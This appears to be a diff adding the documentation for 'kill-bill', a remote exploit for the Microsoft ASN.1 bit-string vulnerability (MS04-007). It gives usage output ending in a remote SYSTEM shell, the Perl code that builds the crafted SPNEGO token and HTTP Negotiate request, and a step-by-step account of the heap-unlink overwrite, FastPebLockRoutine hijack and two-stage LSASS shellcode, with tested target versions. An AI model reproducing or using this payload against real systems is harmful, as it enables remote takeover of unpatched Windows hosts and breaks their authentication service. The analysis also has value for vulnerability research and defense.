@@ -1,0 +1,386 @@
+I. Introduction
+
+This code exploits a previously undisclosed vulnerability in the bit string
+decoding code in the Microsoft ASN.1 library. This vulnerability is not related
+to the bit string vulnerability described in eEye advisory AD20040210-2. Both
+vulnerabilities were fixed in the MS04-007 patch.
+
+II. Screenshots
+
+$ ./kill-bill.pl 
+. kill-bill : Microsoft ASN.1 remote exploit for CAN-2003-0818 (MS04-007)
+  by Solar Eclipse <solareclipse@phreedom.org>
+
+Usage: kill-bill -p <port> -s <service> host
+
+Services:
+   iis           IIS HTTP server (port 80)
+   iis-ssl       IIS HTTP server with SSL (port 443)
+   exchange      Microsoft Exchange SMTP server (port 25)
+   smb-nbt       SMB over NetBIOS (port 139)
+   smb           SMB (port 445)
+
+If a service is running on its default port you don't have to
+specify both the service and the port.
+
+Examples: kill-bill -s iis 192.168.0.1
+          kill-bill -p 80  192.168.0.1
+          kill-bill -p 1234 -s smb 192.168.0.1
+
+$ ./kill-bill.pl -s smb 192.168.0.1
+. kill-bill : Microsoft ASN.1 remote exploit for CAN-2003-0818 (MS04-007)
+  by Solar Eclipse <solareclipse@phreedom.org>
+
+. Loading shellcode
+. Generating SPNEGO token
+  SPNEGO token is 4222 bytes long.
+. Exploiting SMB server at 192.168.0.1:445
+  Sending Negotiate Protocol Request
+  Sending Session Setup AndX request (4287) bytes
+. Attempting to connect to shell on port 8721
+
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) Copyright 1985-2000 Microsoft Corp.
+
+C:\WINNT\system32>
+
+
+III. Bit string decoding in MSASN1.DLL
+
+The bit string heap corruption vulnerability in the Microsoft ASN.1 library was
+reported by eEye on February 10, 2004. This vulnerability occurs during the
+processing of bit string with length 1 and 7 unused bits. For more details
+refer to eEye advisory AD20040210-2.
+
+Bit strings are decoded by BERDecBitString() in MSASN1.DLL. This function
+allocates a new buffer, copies the bit string into it and returns a pointer to
+the data and its length in bits. Constructed bit strings (tag 0x23) are handled
+by calling BERDecBitString() recursively on each element and concatenating the
+results. The pseudocode of BERDecBitString() is given bellow:
+
+struct BITBUF
+{
+    int length_in_bits;
+    char* ptr;
+}
+
+void BERDecBitString(struct DECD *decd, struct BITBUF *bitbuf) {
+
+    /* If the element is empty, return a NULL pointer in bitbuf->ptr
+       and set bitbuf->length_in_bits to 0 */
+	
+    if (ELEMENT_LENGTH = 0)
+        bitbuf->ptr = NULL;
+        bitbuf->length_in_bits = 0;
+        return 1;
+    }
+    
+    if (!ELEMENT_CONSTRUCTED) {
+
+        /* If the element is not constructed (tag 0x03), allocate a new buffer,
+           copy the bit string into it and return it in bitbuf->ptr */
+
+        bitbuf->ptr = alloc(ELEMENT_LENGTH);
+        bitbuf->length_in_bits = ELEMENT_LENGTH * 8;
+        memcpy(bitbuf->ptr, decd->data, ELEMENT_LENGTH);
+    }
+    else {
+
+        /* If the element is constructed (tag 0x23), call BERDecConstructed to
+           allocate 76 bytes for a new DECD object and initialize it with a
+           pointer to the beginning of the constructed bit string. */
+
+        decd2 = BERDecConstructed(decd->data);
+        bitbuf->length_in_bits = 0;
+
+        /* Notice that bitbuf->ptr is not initialized to NULL. This is very
+           important. */
+		
+        while (MORE_DATA(decd2)) {
+            BITBUF bitbuf2;
+
+            /* Decode each of the bit strings in the constructed element */
+
+            BERDecBitString(decd2, &bitbuf2);
+            if (bitbuf2.length == 0)
+               continue;
+
+            /* Reallocate the buffer and append each bit string to it */
+
+            bitbuf->ptr = realloc(bitbuf->ptr, bitbuf->length + bitbuf2.length);
+            memcpy(bitbuf->ptr+bitbuf->length, bitbuf2.ptr, bitbuf2.length);
+
+            free(bitbuf2.ptr);
+        }
+    }
+}
+
+Let's look at an example bit string:
+
+"\x23\x08"                      # constructed bit string, length=8
+    "\x03\x03\x00"              # bit string, length=3, unused bits=0
+        "AA"
+    "\x03\x02\x00"              # bit string, length=2, unused bits=0
+        "B"
+
+For clarity we will use a representation similar to the Perl code used to build
+bit strings in our exploit:
+
+constr(
+    bits("AA"),
+    bits("B")
+)
+
+When this constructed bit string BERDecBitString() will be called twice to
+decode the "AA" and "B" bit strings. Each time the size of the B buffer will be
+increased by calling realloc and the new bit string will be appended to it.
+
+
+IV. The realloc() vulnerability
+
+There is a problem in the MSASN1.DLL which is much easier to exploit than the
+eEye vulnerability. The BERDecBitString function does not properly handle
+constructed bit strings which contain constructed bit strings.
+
+The following example illustrates the problem:
+
+constr(
+    bits("AAAAAAAA"),
+    constr(
+        bits("BBBBBBBB")
+    )
+)
+
+When BERDecBitString is called on this bit string, the bitbuf->ptr pointer is
+initially NULL. Since this is a constructed element, BERDecBitString is called
+again to decode the "AAAAAAAA" bit string. It allocates a new buffer of size 8
+and copies "AAAAAAAA" into it. The new buffer is returned in bitbuf2->ptr. We
+call realloc(bitbuf->ptr, 8) to allocate space for the 8 bytes of data. Since
+bitbuf->ptr is NULL, this call is equivalent to alloc(8).  We copy the data
+from bitbuf2->ptr to bitbuf->ptr and free bitbuf2->ptr.
+
+Now bitbuf->ptr is a pointer to a 8 byte buffer containing "AAAAAAAA".  The
+original buffer has been freed and bitbuf2->ptr points to the freed memory.
+
+We go back to the beginning of the while loop and call BERDecBitString to
+decode the next element, which is the second constructed bit string. Before it
+starts decoding it, the function initializes bitbuf->length_in_bits to 0, but
+bitbuf->ptr still contains the value passed by the caller, a pointer to freed
+memory. If bitbuf->ptr were initialized to NULL, as it is in the version of
+MSASN1.DLL included in the MS04-007 hotfix, the vulnerability would not exist.
+
+The first element of the constructed bit string is the "BBBBBBBB" bit string,
+which is decoded by calling BERDecBitString. It allocates 8 bytes, copies
+"BBBBBBBB" into the 8 byte buffer and returns a pointer to it as bitbuf2->ptr.
+Then we calculate the new size of the bitbuf->ptr buffer and call
+realloc(bitbuf->ptr, 8).
+
+At this point bitbuf->ptr still points to the freed memory chunk which used to
+contain "AAAAAAAA". What happens when we pass a pointer to a free chunk to the
+NtReallocateHeap() function? It should return NULL to indicate an error, but
+due to a design flaw it returns its argument. Now the program believes that it
+has allocated a new buffer of size 8, but in fact it is about to overwrite the
+first 8 bytes of a freed memory chunk with the "BBBBBBBB" bit string.
+
+
+V. NT heap overview
+
+The Windows NT heap allocator is similar to the Linux malloc implementation.
+All available memory is split into chunks which can be either free or in use.
+Each chunk has a 8 byte header, containing the size of the current chunk, the
+size of the previous chunk and flags. The user data starts at chunk+8.
+
+When a chunk is freed, it is coalesced with the previous and next chunks if
+they are also free. Then the chunk is inserted into a doubly linked list of
+free chunks. There are 127 such lists, for chunks of size 8, 16, 24, 32,
+up to 1016. These are called dedicated lists. Chunks larger than 1024 bytes
+are stored in a non-dedicated list, sorted in ascending order by their size.
+
+When an application tries to allocate some amount of memory, the dedicated
+list for the exact size is searched first. If it is empty, the list for the
+next chunk size is searched and so on, until we find a free chunk or we go
+through all dedicated lists without finding one. In this case we have to
+search the non-dedicated list. The heap allocator starts at the head of the
+list and follows the forward pointer until it finds a big enough chunk. Since
+the non-dedicated list is sorted by chunk size, we are guaranteed to find the
+smallest chunk satisfying our request size. If there are no free chunks
+available, we have to request more memory from the kernel.
+
+The free chunk we have found is taken off the free list and marked "in use".
+A pointer to the user data in the chunk is returned to the application.
+
+It is important to note than the forward and backward pointers that link the
+chunks in a free list are stored in the first 8 bytes of the user data of a
+chunk. This means that if we can write 8 bytes to a buffer that has already
+been freed, we will overwrite the linked list pointers. Once this is done,
+the operations of adding a chunk to the free list and removing one from the
+list can be used to write to an arbitrary location in memory.
+
+
+VI. Constructing the exploit
+
+There are many attack vectors for this vulnerability, but to develop this
+exploit we will use the Negotiate protocol for HTTP authentication, described
+in http://msdn.microsoft.com/library/en-us/dnsecure/html/http-sso-2.asp
+
+We will build a SPNEGO token containing a specially crafted constructed bit
+string, encode it in Base64 and send it as a part of a HTTP GET request. The
+default IIS configuration allows Windows authentication and our SPNEGO token
+will be passed to MSASN1.DLL for decoding.
+
+$bitstring =
+    constr(
+        bits("a"x1040),
+        "\x03\x00",
+        constr(
+            bits("B"x1033),
+            constr(
+                bits($fw, $bk)
+            ),
+            constr(
+                bits("C"x1040),
+                constr(
+                    bits("\xeb\06\x90\x90\x90\x90\x90\x90"),
+                    bits("D"x1040),
+                )
+            )
+        )
+    );
+
+$spnego =
+    "\x60" . asn1(                      # Application Constructed Object
+        "\x06\x06\x2b\x06\x01\x05\x05\x02" .    # SPNEGO OID
+        "\xa0" . asn1(                  # NegTokenInit (0xa0)
+            "\x30" . asn1(              # Constructed Sequence
+                "\xA1" . asn1(          # ContextFlags (0xa1)
+                    $bitstring
+                )
+            )
+        )
+    );
+
+$request =
+    "GET / HTTP/1.1\r\n" .
+    "Authorization: Negotiate " . encode_base64($spnego, "") . "\r\n" .
+    "\r\n";
+
+The bit string used in the exploit is complicated due to the fact that we need
+the ASN.1 decoder function to perform a specific sequence of memory allocations
+in order to corrupt the heap but not crash the application.
+
+This exploit is different from most Windows heap exploit because we can control
+the memory allocation pattern of the decoder by supplying it with bit strings
+of different length. This allows us to do multiple arbitrary 4 byte overwrites
+and exploit the vulnerability with a high degree of reliability.
+
+The desired sequence of memory operations is given bellow:
+
+free(B)
+memcpy(B, "AAAABBBB", 8);
+alloc(size of B)
+memcpy(B, "CCCCDDDD", 8)
+free(B)
+alloc(size of B)
+
+After we overwrite the FW and BK pointers of a freed block, we allocate a block
+of the same size. The NtHeapAllocate() function walks the linked list of free
+blocks and reaches the block with the overwritten pointers. Since it satisfies
+the request size it is removed from the linked list, marked as in-use and
+returned to the application. If the overwritten FW and BK pointers point to
+writable memory the unlink operation will succeed, but the block will still be
+on the free list.
+
+When the block is freed, the NtFreeHeap() function walks the linked list
+of free blocks until it finds a block of equal or greater size. Then the freed
+block is inserted into the linked list in front of that block. In our case the
+block we're freeing will still be on the free list, so it will be the block we
+find.
+
+When NtFreeHeap() inserts a block into the free list, it manipulates three
+blocks, labeled A, B and C. Block B is to be inserted between A and C. The
+code to do this is given bellow:
+
+    B->fw = C
+    B->bk = C->bk
+    C->bk->fw = B
+    C->bk = B
+
+In our case blocks B and C are the same, so the code is equivalent to
+
+    B->fw = B
+    B->bk = B->bk
+    B->bk->fw = B
+    B->bk = B
+
+Assuming the address of B is in ebx, the executed instructions will have the
+same effect as
+
+    mov [ebx], ebx
+    mov eax, [ebx+4]
+    mov [eax], ebx
+    mov [ebx+4], ebx
+ 
+This code writes the address of the block we are freeing into the location
+specified by the value at block+4. The ability to write the address of our
+block to an arbitrary address in memory makes it very easy to write a reliable
+exploit.
+
+In our exploit we overwrite the FastPebLockRoutine pointer at PEB+0x20. If we
+allow the program to continue its execution, our shellcode buffer may be freed
+or overwritten before the program calls the FastPebLockRoutine. That's why we
+make the final allocation request for a block of the same size as our shellcode
+block. During the search for a suitable free block, NtAllocateHeap() finds the
+shellcode block (which is still on the free list) and attempts to unlink it. If
+we make sure that the first two dwords in the shellcode point to invalid memory
+space (such as 0x90909090), an exception will occur.
+
+The exception is handled by an exception handler in LSASRV.DLL, which writes
+the following to the EventLog:
+
+"The security package Negotiate generated an exception. The package is now
+disabled."
+
+One of the functions involved in writing to the event log locks the PEB by
+calling the FastPebLockRoutine, which now points to our shellcode.
+
+After the Negotiate protocol is disabled the system keep running, but
+interactive logins fail.
+
+
+VII. Shellcode
+
+This vulnerability presents specific requirements for our shellcode which make
+it impossible to use a generic payload. During the execution of the exception
+handler the LSASS.EXE process is blocked and unable to serve any authentication
+requests. If our shellcode executes a process or uses a system function which
+sends a request to Local Security Authority, a deadlock will occur. If
+LSASS.EXE is killed the system will reboot. It is very important that the
+exception handler in LSASS is allowed to continue its execution.
+
+To accomplish this our shellcode is split in two stages. Stage 0 restores the
+FastPebLockRoutine pointer and repairs the heap. The stage 1 shellcode is then
+executed in a new thread. In the parent thread the stage 0 shellcode jumps to
+RtlEnterCriticalSection and the execution of the exception handler continues
+without any trace of being exploited.
+
+There are almost no restrictions on what the stage 1 shellcode can do, as long
+as it does not crash the process it is running in. After the shellcode
+completion it should terminate its thread by calling ExitThread or simply
+execute a return instruction.
+
+
+VII. Notes
+
+The exploit has been tested and is known to work on Windows 2000 SP2, SP3, SP4
+and Windows XP SP0 and SP1.
+
+On Windows 2000 SP0 and SP1 the FastPebLockRoutine pointer is overwritten, but
+it is never called by LSASS.EXE. An alternative exploitation method, such as
+overwriting the unhandled exception handler has to be used.
+
+TODO:
+
+* alternative exploitation method for Win2k SP0, SP1 and Win2003
+* SSL support
+* support for Microsoft Exchange
+* does Exchange support SPNEGO over POP3 and IMAP ?
